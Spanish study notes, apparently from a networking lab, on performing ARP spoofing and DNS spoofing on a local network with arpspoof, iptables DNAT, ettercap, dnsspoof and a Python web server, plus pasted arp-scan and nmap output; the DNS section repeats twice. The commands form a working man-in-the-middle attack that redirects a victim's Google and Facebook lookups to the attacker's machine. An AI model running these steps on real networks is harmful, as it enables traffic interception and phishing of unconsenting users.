# Notas

## ARP Spoofing
Para redirigir el tráfico correctamente, habilita el reenvío de paquetes en tu máquina:

mira iptables y tablas arp
```
janrax@janrax-Legion-5-15ACH6H:~$ sudo iptables --flush
janrax@janrax-Legion-5-15ACH6H:~$ sudo iptables -S

arp -n
```




```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

```bash
sudo apt install dsniff

```

El ataque ARP spoofing engaña a un dispositivo para que asocie una dirección IP con una dirección MAC falsa. A continuación, te explico cómo puedes realizar un ARP spoofing en Kali Linux para engañar a la máquina en la red.

### **ADVERTENCIA**
El uso de técnicas de ARP spoofing es ilegal si no tienes permiso explícito para realizarlas. Realiza estos pasos únicamente en redes de prueba o con el consentimiento de los administradores de la red.

---

### **Pasos para Realizar ARP Spoofing**

#### 1. **Configurar IP Forwarding**
Para redirigir el tráfico correctamente, habilita el reenvío de paquetes en tu máquina:
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

#### 2. **Identificar las Direcciones IP y MAC**
- IP del objetivo: `192.168.1.67`
- Dirección IP falsa de DNS que quieres usar: `192.168.1.62`
- Dirección IP real del DNS (gateway): `192.168.1.1`

Verifica las direcciones IP y las MAC utilizando `arp-scan` o `nmap`:
```bash
sudo arp-scan --localnet
```

#### 3. **Instalar y Usar `arpspoof`**
El paquete `dsniff` incluye `arpspoof`. Si no lo tienes instalado, instálalo con:
```bash
sudo apt install dsniff
```

Luego, ejecuta `arpspoof` para engañar al objetivo:
```bash
sudo arpspoof -i eth0 -t 192.168.1.67 192.168.1.1
```
Esto hará que la máquina `192.168.1.67` piense que el gateway está asociado a tu dirección MAC.

#### 4. **Redirigir el Tráfico DNS**
Para redirigir el tráfico DNS al servidor falso (`192.168.1.62`), puedes usar `iptables` para redirigir las solicitudes DNS (puerto 53):
```bash
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.62
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

#### 5. **Comprobar la Redirección**
En la máquina de la víctima (`192.168.1.67`), verifica que el DNS esté siendo redirigido a `192.168.1.62`. Usa herramientas como:
```bash
nslookup example.com
```

Si todo está configurado correctamente, las solicitudes DNS desde la máquina víctima se resolverán en el servidor falso.

#### 6. **Desactivar ARP Spoofing y Limpiar las Reglas**
Cuando termines, detén `arpspoof` con `Ctrl + C` y limpia las reglas de `iptables`:
```bash
sudo iptables -t nat -F
sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### **Opcional: Usar `ettercap` para ARP Spoofing**
Otra herramienta útil es `ettercap`, que incluye funciones integradas para ARP spoofing y DNS redirección.

1. **Ejecuta ettercap en modo texto:**
   ```bash
   sudo ettercap -T -i eth0 -M arp:remote /192.168.1.67/ /192.168.1.1/
   ```

2. **Configura un archivo de DNS spoofing**:
   Edita `/etc/ettercap/etter.dns` para incluir tus dominios personalizados.

---


# más apuntes

# Notas dns spoofing ( suplantacion dns )

## soy
alumno@alumno-VirtualBox:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:44:a7:ac brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.67/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
       valid_lft 39063sec preferred_lft 39063sec
    inet6 fe80::47eb:1970:521f:f744/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever


## puerta enlace

alumno@alumno-VirtualBox:~$ route -n
Tabla de rutas IP del núcleo
Destino         Pasarela        Genmask         Indic Métric Ref    Uso Interfaz
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 enp0s3
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 enp0s3

## busco vecinos
alumno@alumno-VirtualBox:~$ sudo apt install arp-scan nmap


alumno@alumno-VirtualBox:~$ sudo arp-scan --localnet
Interface: enp0s3, type: EN10MB, MAC: 08:00:27:44:a7:ac, IPv4: 192.168.1.67
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	cc:d4:a1:66:b0:34	(Unknown)
192.168.1.36	04:5d:4b:29:fb:97	(Unknown)
192.168.1.51	88:a4:c2:c5:8e:f7	(Unknown)
192.168.1.52	08:00:27:ad:25:87	(Unknown)
192.168.1.62	88:a4:c2:c5:8e:f7	(Unknown)
192.168.1.44	c8:be:19:5b:b5:03	(Unknown)
192.168.1.69	08:00:27:13:6a:12	(Unknown)

### más detalle
``
lumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:36 CET
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0063s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
23/tcp  filtered telnet
80/tcp  open     http
443/tcp open     https
MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)

Nmap scan report for 192.168.1.36
Host is up (0.0057s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt
9000/tcp open  cslistener
MAC Address: 04:5D:4B:29:FB:97 (Sony)

Nmap scan report for 192.168.1.44
Host is up (0.0039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http
MAC Address: C8:BE:19:5B:B5:03 (D-Link International)

Nmap scan report for 192.168.1.51
Host is up (0.000061s latency).
All 1000 scanned ports on 192.168.1.51 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.52
Host is up (0.00011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.1.62
Host is up (0.000053s latency).
All 1000 scanned ports on 192.168.1.62 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.69
Host is up (0.00027s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)

Nmap scan report for alumno-VirtualBox (192.168.1.67)
Host is up (0.0000060s latency).
All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (8 hosts up) scanned in 34.98 seconds
alumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:38 CET
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0041s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
23/tcp  filtered telnet
80/tcp  open     http
443/tcp open     https
MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)

Nmap scan report for 192.168.1.36
Host is up (0.0048s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt
9000/tcp open  cslistener
MAC Address: 04:5D:4B:29:FB:97 (Sony)

Nmap scan report for 192.168.1.44
Host is up (0.0048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http
MAC Address: C8:BE:19:5B:B5:03 (D-Link International)

Nmap scan report for 192.168.1.51
Host is up (0.0029s latency).
All 1000 scanned ports on 192.168.1.51 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.52
Host is up (0.00012s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.1.62
Host is up (0.000056s latency).
All 1000 scanned ports on 192.168.1.62 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.69
Host is up (0.00023s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)

Nmap scan report for alumno-VirtualBox (192.168.1.67)
Host is up (0.0000060s latency).
All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
```
## elijo que dominios voy capturar
lumno@alumno-VirtualBox:~$ sudo cat /etc/dnsspoof.conf
192.168.1.67 google.com
192.168.1.67 facebook.com
192.168.1.67 facebook.es


## redirijo trafico interceptado

alumno@alumno-VirtualBox:~$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward


## enveneno arp para que la victima piense que soy el gateway, le digo ip gateway tiene mi mac
sudo arpspoof -i enp0s3 -t 192.168.1.69 192.168.1.1

alumno@alumno-VirtualBox:~$ cat /etc/dnsspoof.conf
192.168.1.67 janrax.es
192.168.1.67 facebook.es

## proceso trafico dns

alumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1

```
lumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
alumno@alumno-VirtualBox:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A FORWARD -p udp -m udp --dport 53 -j NFQUEUE --queue-num 1
alumno@alumno-VirtualBox:~$ sudo iptables -F
alumno@alumno-VirtualBox:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT

```

## lanzo el dns spoofing


alumno@alumno-VirtualBox:~$ sudo dnsspoof -f /etc/dnsspoof.conf -i enp0s3



more

# Notas dns spoofing ( suplantacion dns )

## soy
alumno@alumno-VirtualBox:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:44:a7:ac brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.67/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
       valid_lft 39063sec preferred_lft 39063sec
    inet6 fe80::47eb:1970:521f:f744/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever


## puerta enlace

alumno@alumno-VirtualBox:~$ route -n
Tabla de rutas IP del núcleo
Destino         Pasarela        Genmask         Indic Métric Ref    Uso Interfaz
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 enp0s3
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 enp0s3

## busco vecinos
alumno@alumno-VirtualBox:~$ sudo apt install arp-scan nmap


alumno@alumno-VirtualBox:~$ sudo arp-scan --localnet
Interface: enp0s3, type: EN10MB, MAC: 08:00:27:44:a7:ac, IPv4: 192.168.1.67
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	cc:d4:a1:66:b0:34	(Unknown)
192.168.1.36	04:5d:4b:29:fb:97	(Unknown)
192.168.1.51	88:a4:c2:c5:8e:f7	(Unknown)
192.168.1.52	08:00:27:ad:25:87	(Unknown)
192.168.1.62	88:a4:c2:c5:8e:f7	(Unknown)
192.168.1.44	c8:be:19:5b:b5:03	(Unknown)
192.168.1.69	08:00:27:13:6a:12	(Unknown)

### más detalle
``
lumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:36 CET
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0063s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
23/tcp  filtered telnet
80/tcp  open     http
443/tcp open     https
MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)

Nmap scan report for 192.168.1.36
Host is up (0.0057s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt
9000/tcp open  cslistener
MAC Address: 04:5D:4B:29:FB:97 (Sony)

Nmap scan report for 192.168.1.44
Host is up (0.0039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http
MAC Address: C8:BE:19:5B:B5:03 (D-Link International)

Nmap scan report for 192.168.1.51
Host is up (0.000061s latency).
All 1000 scanned ports on 192.168.1.51 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.52
Host is up (0.00011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.1.62
Host is up (0.000053s latency).
All 1000 scanned ports on 192.168.1.62 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.69
Host is up (0.00027s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)

Nmap scan report for alumno-VirtualBox (192.168.1.67)
Host is up (0.0000060s latency).
All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (8 hosts up) scanned in 34.98 seconds
alumno@alumno-VirtualBox:~$ sudo nmap 192.168.1.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 11:38 CET
Nmap scan report for _gateway (192.168.1.1)
Host is up (0.0041s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
23/tcp  filtered telnet
80/tcp  open     http
443/tcp open     https
MAC Address: CC:D4:A1:66:B0:34 (MitraStar Technology)

Nmap scan report for 192.168.1.36
Host is up (0.0048s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8008/tcp open  http
8009/tcp open  ajp13
8443/tcp open  https-alt
9000/tcp open  cslistener
MAC Address: 04:5D:4B:29:FB:97 (Sony)

Nmap scan report for 192.168.1.44
Host is up (0.0048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http
MAC Address: C8:BE:19:5B:B5:03 (D-Link International)

Nmap scan report for 192.168.1.51
Host is up (0.0029s latency).
All 1000 scanned ports on 192.168.1.51 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.52
Host is up (0.00012s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:AD:25:87 (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.1.62
Host is up (0.000056s latency).
All 1000 scanned ports on 192.168.1.62 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 88:A4:C2:C5:8E:F7 (LCFC(Hefei) Electronics Technology)

Nmap scan report for 192.168.1.69
Host is up (0.00023s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:13:6A:12 (Oracle VirtualBox virtual NIC)

Nmap scan report for alumno-VirtualBox (192.168.1.67)
Host is up (0.0000060s latency).
All 1000 scanned ports on alumno-VirtualBox (192.168.1.67) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
```
## elijo que dominios voy capturar
lumno@alumno-VirtualBox:~$ sudo cat /etc/dnsspoof.conf
192.168.1.67 google.com
192.168.1.67 facebook.com
192.168.1.67 facebook.es


## redirijo trafico interceptado

alumno@alumno-VirtualBox:~$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward


## enveneno arp para que la victima piense que soy el gateway, le digo ip gateway tiene mi mac
sudo arpspoof -i enp0s3 -t 192.168.1.69 192.168.1.1

alumno@alumno-VirtualBox:~$ cat /etc/dnsspoof.conf
192.168.1.67 janrax.es
192.168.1.67 facebook.es

## proceso trafico dns

alumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1

```
lumno@alumno-VirtualBox:~$ sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
alumno@alumno-VirtualBox:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A FORWARD -p udp -m udp --dport 53 -j NFQUEUE --queue-num 1
alumno@alumno-VirtualBox:~$ sudo iptables -F
alumno@alumno-VirtualBox:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT

```

## lanzo el dns spoofing


alumno@alumno-VirtualBox:~$ sudo dnsspoof -f /etc/dnsspoof.conf -i enp0s3

## ten servidor http esperando

sudo python3 -m http.server 80












## Arrancar servidor web local con python

```sh
sudo python3 -m http.server 80
```
